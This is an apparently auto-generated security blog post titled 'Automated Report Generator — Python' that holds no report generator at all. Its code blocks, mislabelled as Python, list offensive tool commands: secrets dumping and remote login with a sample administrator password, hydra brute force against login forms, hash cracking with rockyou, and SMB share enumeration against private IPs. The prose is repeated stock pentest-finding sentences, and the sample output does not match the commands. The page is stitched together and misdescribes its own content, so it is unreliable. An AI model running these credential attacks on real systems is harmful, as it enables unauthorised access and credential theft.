---
TitleSEO: "Automated Report Generator in Python | ZureFX"
TitlePost: "Automated Report Generator — Python"
Author: "ZureFX"
Description: "A Python script for automated report generator. Built for security research and automation."
Keywords: "c, script, powershell, fuzzer, scanner, python"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-699.html"
URL_IMAGES: ""
Date: "2024-01-15"
Tags: "C, Script, PowerShell, Fuzzer, Scanner, Python"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-699"
Permalink: "/scripting/script-automated-report-generator-699.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `ldapsearch`
- `impacket`
- `nikto`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.247.243
evil-winrm -i 10.98.236.101 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.133.208 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.44.134.121 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

```python
nmap -sCV -p21,3389,143 10.35.228.242 -oN scan.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.133.226 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.156.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.166.62
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.108.227.222 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.108.246.136 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.201.22
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p587,5986,587 10.27.151.180 -oN scan.txt
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 24.79s
```
